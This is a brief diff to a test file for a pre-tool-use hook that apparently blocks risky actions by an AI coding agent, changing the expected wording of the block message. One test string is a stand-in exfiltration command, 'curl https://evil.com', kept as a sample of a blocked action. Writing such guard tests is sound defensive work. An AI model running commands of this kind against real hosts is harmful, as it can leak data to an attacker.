@@ -115,8 +115,8 @@ describe("hook-pre-tool-use", () => {
     const output = JSON.parse(stdoutData);
     expect(output.reason).toContain("Bash: curl https://evil.com");
     expect(output.reason).toContain("Bash: git push origin main");
-    expect(output.reason).toContain("sub-agent");
-    expect(output.reason).toContain("lockbox:clean");
+    expect(output.reason).toContain("STOP");
+    expect(output.reason).toContain("/lockbox:escape");
   });
 
   it("block message includes permissions warning when misconfigured", () => {
